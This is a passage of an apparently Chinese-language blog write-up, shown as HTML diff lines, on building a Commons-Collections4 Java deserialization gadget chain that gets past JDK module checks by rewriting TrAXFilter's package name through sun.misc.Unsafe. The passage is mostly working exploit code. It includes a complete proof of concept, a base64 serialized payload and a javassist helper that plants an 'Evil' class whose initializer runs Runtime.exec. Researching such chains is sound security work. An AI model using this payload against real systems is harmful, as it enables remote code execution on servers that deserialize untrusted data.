+                ></p>
+<p>继续完善我们的 Transformer 数组：</p>
+<p>调用 getAndSetObject 修改包名</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                sun.misc.Unsafe.class</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;getDeclaredField&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;theUnsafe&quot;</span>&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClosureTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">TransformerClosure</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                <span class="string">&quot;setAccessible&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">boolean</span>.class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">true</span>&#125;</span><br><span class="line">                        )</span><br><span class="line">                )</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;get&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;getAndSetObject&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, <span class="type">long</span>.class, Object.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>), <span class="number">60</span>, <span class="string">&quot;org.xml.sax&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里的 60 是这么来的：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">unsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;packageName&quot;</span>));</span><br><span class="line">        System.out.println(addr); <span class="comment">// 60</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后后面就是正常 CC4 的流程了，传 TrAXFilter.class 给 InstantiateTransformer 调 transform 方法去实例化</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                        sun.misc.Unsafe.class</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getDeclaredField&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;theUnsafe&quot;</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClosureTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TransformerClosure</span>(</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                        <span class="string">&quot;setAccessible&quot;</span>,</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">boolean</span>.class&#125;,</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">true</span>&#125;</span><br><span class="line">                                )</span><br><span class="line">                        )</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getAndSetObject&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, <span class="type">long</span>.class, Object.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>), <span class="number">60</span>, <span class="string">&quot;org.xml.sax&quot;</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                        TrAXFilter.class</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;getTemplates()&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>最下面两个这样写会爆红，因为 TrAXFilter 和 Templates 都是 sun.misc 包下面的，直接 import 会被模块检测，可以用 Class.forName() 获取，最终 POC如下</p>
+<h1 id="最终-POC"><a href="#最终-POC" class="headerlink" title="最终 POC"></a>最终 POC</h1><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                        sun.misc.Unsafe.class</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getDeclaredField&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;theUnsafe&quot;</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClosureTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TransformerClosure</span>(</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                        <span class="string">&quot;setAccessible&quot;</span>,</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">boolean</span>.class&#125;,</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">true</span>&#125;</span><br><span class="line">                                )</span><br><span class="line">                        )</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getAndSetObject&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, <span class="type">long</span>.class, Object.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>), <span class="number">60</span>, <span class="string">&quot;org.xml.sax&quot;</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                        Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>)</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesUtil.getTemplates()&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, transformingComparator);</span><br><span class="line">        ReflectUtil.setFieldValue(priorityQueue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        System.out.println(SerializeUtil.serializeToBase64(priorityQueue));</span><br><span class="line"><span class="comment">//        String s = &quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAB3NyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAD3N1bi5taXNjLlVuc2FmZQAAAAAAAAAAAAAAeHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAF0AAl0aGVVbnNhZmV0ABBnZXREZWNsYXJlZEZpZWxkdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2xvc3VyZVRyYW5zZm9ybWVyBqPbHKGgbUYCAAFMAAhpQ2xvc3VyZXQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L0Nsb3N1cmU7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5UcmFuc2Zvcm1lckNsb3N1cmW3563DrldcVwIAAUwADGlUcmFuc2Zvcm1lcnEAfgAEeHBzcQB+ABJ1cQB+ABcAAAABc3IAEWphdmEubGFuZy5Cb29sZWFuzSBygNWc+u4CAAFaAAV2YWx1ZXhwAXQADXNldEFjY2Vzc2libGV1cQB+ABsAAAABdnIAB2Jvb2xlYW4AAAAAAAAAAAAAAHhwc3EAfgASdXEAfgAXAAAAAXB0AANnZXR1cQB+ABsAAAABdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwc3EAfgASdXEAfgAXAAAAA3ZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAA8dAALb3JnLnhtbC5zYXh0AA9nZXRBbmRTZXRPYmplY3R1cQB+ABsAAAADcQB+ADF2cgAEbG9uZwAAAAAAAAAAAAAAeHBxAH4AMXNxAH4ADXEAfgA1c3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3NxAH4AE1sAC2lQYXJhbVR5cGVzcQB+ABV4cHVxAH4AFwAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAVTAAFX25hbWVxAH4AFEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAAAAAAB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAABUsr+ur4AAAA3ABkBAARFdmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAIAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwACgALCgAJAAwBAARjYWxjCAAOAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEAARCgAJABIBAAY8aW5pdD4MABQABgoABAAVAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQAhAAIABAAAAAAAAgAIAAUABgABAAcAAAAWAAIAAAAAAAq4AA0SD7YAE1exAAAAAAABABQABgABAAcAAAARAAEAAQAAAAUqtwAWsQAAAAAAAQAXAAAAAgAYdXEAfgBIAAAAnsr+ur4AAAA3AAwBAAdVc2VsZXNzBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAxVc2VsZXNzLmphdmEBAAY8aW5pdD4BAAMoKVYMAAcACAoABAAJAQAEQ29kZQAhAAIABAAAAAAAAQABAAcACAABAAsAAAARAAEAAQAAAAUqtwAKsQAAAAAAAQAFAAAAAgAGcHQACHVzZWxlc3MxcHcBAHh1cQB+ABsAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHcEAAAAA3BweA==&quot;;</span></span><br><span class="line"><span class="comment">//        SerializeUtil.deserializeFromBase64(s);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>用到的工具类如下：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesUtil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        UnsafeUtil.patchModule(TemplatesUtil.class, templatesClass);</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evil</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        evil.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> templatesClass.newInstance();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">useless</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Useless&quot;</span>);</span><br><span class="line">        ReflectUtil.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evil.toBytecode(), useless.toBytecode()&#125;);</span><br><span class="line">        ReflectUtil.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;useless1&quot;</span>);</span><br><span class="line">        ReflectUtil.setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化对象为字节数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">arr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(arr)) &#123;</span><br><span class="line">            output.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化字节数组为对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] arr)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> (</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(arr)</span><br><span class="line">                )</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="keyword">return</span> input.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化对象并编码为Base64字符串</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serializeToBase64</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] serializedData = serialize(obj);</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(serializedData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从Base64字符串解码并反序列化为对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromBase64</span><span class="params">(String base64)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] decodedData = Base64.getDecoder().decode(base64);</span><br><span class="line">        <span class="keyword">return</span> deserialize(decodedData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试序列化和反序列化过程</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        deserialize(serialize(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
